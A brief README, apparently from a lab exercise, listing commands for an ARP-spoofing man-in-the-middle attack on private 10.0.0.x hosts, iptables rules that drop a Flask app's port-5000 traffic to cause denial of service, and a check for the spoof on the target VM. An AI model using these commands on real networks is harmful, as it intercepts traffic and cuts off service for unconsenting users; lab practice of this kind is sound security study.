# Man-in-the-Middle and DoS attack
 
## Command to Start ARP Spoof
```bash
sudo arpspoof -i ens33 -t 10.0.0.45 -r 10.0.0.133
```
## Commands to Filter Out Packets

These commands drop packets for and from the victim, specifically targeting the Flask application:
```bash
sudo iptables -A FORWARD -s 10.0.0.133 -d 10.0.0.45 -p tcp --sport 5000 -j DROP
sudo iptables -A FORWARD -s 10.0.0.45 -d 10.0.0.133 -p tcp --dport 5000 -j DROP
```

## Command to Verify ARP Spoof on the Target VM

Run the following command on the target VM to check if an ARP spoof has occurred:
```bash
arp -a
```
